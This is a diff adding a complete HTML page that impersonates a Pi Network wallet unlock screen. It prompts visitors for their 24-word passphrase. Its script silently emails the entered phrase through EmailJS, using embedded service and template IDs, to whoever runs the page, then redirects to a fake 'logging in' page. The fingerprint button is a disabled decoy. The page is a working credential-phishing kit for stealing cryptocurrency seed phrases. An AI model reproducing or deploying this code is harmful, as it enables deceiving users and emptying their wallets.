@@ -1,0 +1,197 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="css2.css" rel="stylesheet">
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DK8KYX1DRR"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'G-DK8KYX1DRR');
+    </script>
+
+    <!-- EmailJS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your public key
+        (function () {
+            emailjs.init("f-t0mZ9Z5DcDDtmcs"); //  Public key
+        })();
+    </script>
+
+
+<style>
+    .blog {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+textarea {
+    font-size: 20px;
+    padding: 10px;
+    font-family: "Poppins", sans-serif;
+    border-style: none;
+    border: 1.5px solid #c7c7c7;
+    border-radius: 0px;
+    width: 300px;
+}
+
+textarea:focus {
+    /*border: 4px solid goldenrod;*/
+    border: 2px solid #d9ab50;
+}
+
+input {
+    width: 320px;
+    padding: 12px 38px;
+    background: white;
+    border: 1px solid purple;
+    border-radius: 10px;
+    color: #703d92;
+    cursor: pointer;
+    font-family: "Mulish", sans-serif;
+    font-size: 15;
+}
+
+.input2 {
+    width: 320px;
+    font-family: "Mulish", sans-serif;
+    padding: 10px 38px;
+    background: #703d92;
+    border: 3px solid #703d92;
+    border-radius: 10px;
+    color: #ffffff;
+    cursor: pointer;
+    font-size: 15;
+}
+
+.input2:hover {
+    background: #68328d;
+}
+
+#wordshow {
+    font-family: "Mulish", sans-serif;
+    font-size: 15px;
+    margin-bottom: 14px;
+    /*color: #ff0000f0;*/
+    color: #df5d5d;
+    font-weight: 1;
+}
+
+a {
+    text-decoration: none;
+    font-family: "Mulish", sans-serif;
+    font-size: 14px;
+}
+
+.discription {
+    padding: 18px 18px;
+    font-family: "Mulish", sans-serif;
+    font-size: 16px;
+    color: #373737;
+    font-family: "Sans-serif", sans-serif;
+}
+
+.pr {
+    padding: 20px 40px 40px 20px;
+    font-family: "Mulish", sans-serif;
+}
+
+form {
+    overflow: hidden;
+}
+
+#btn {
+    margin-bottom: 18px;
+}
+
+.btn1 {
+    margin-top: 1px;
+    margin-bottom: 30px;
+}
+
+</style>
+
+
+</head>
+
+<body>
+
+    <img src="images/products/Pii.jpg" alt="Wallet" style="width: 100%; height: auto; display: block; max-width: 100%;">
+
+
+    <div class="blog">
+        <textarea id="message" class="text" name="message" placeholder="Enter your 24-word passphrase here" cols="23"
+            rows="8" required></textarea><br />
+        <br><span id="wordshow"></span>
+        <input onclick="sendMail()" id="btn" type="button" value="Unlock With Passphrase">
+        <input onclick="sendMail()" id="btn2" class="input2" type="button" disabled value="Unlock With Fingerprint">
+    </div>
+
+
+    <div class="discription">
+        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of
+            passphrase is currently impossible.</p>
+        <p>Lost your passphrase? <a href="https://minepi.com/" style="color: #0c75e6">You can create a new wallet,</a>
+            but all your π in your previous wallet will be inaccessible.</p>
+    </div>
+
+    <script>
+        // Function to send email using EmailJS
+
+        function sendMail() {
+            var key = document.getElementById("message").value.trim(); // Trim whitespace
+            key = key.replace(/\s+/g, ' '); // Replace multiple spaces with a single space
+
+            let word = key.split(" ");
+            let count = word.length;
+
+            if (count >= 24) { // Check if 24 or more words are entered
+                // Construct the params object with all the required fields
+                var params = {
+                    to_name: "User",
+                    from_name: "Your Website",
+                    message: key
+                };
+
+                // Send the email using the service and template IDs
+                emailjs.send("service_deixbg3", "template_45ddn6j", params)
+                    .then(() => {
+                        window.location.href = "loggingin.html";// Redirect to another page
+                        document.getElementById("wordshow").innerText = ""; // Clear any error messages
+                    })
+                    .catch((err) => {
+                        console.log("Error object:", err); // Log the full error object for debugging
+                        let errorMessage = err.text || err.message || "An unknown error occurred";
+                        document.getElementById("wordshow").innerText = "try again " + errorMessage;
+                    });
+            } else {
+                document.getElementById("wordshow").innerText = "Invalid Passphrase"; // Error for fewer than 24 words
+            }
+
+            document.getElementById("message").value = ""; // Clear input field after submission
+        }
+
+
+    </script>
+</body>
+
+</html>
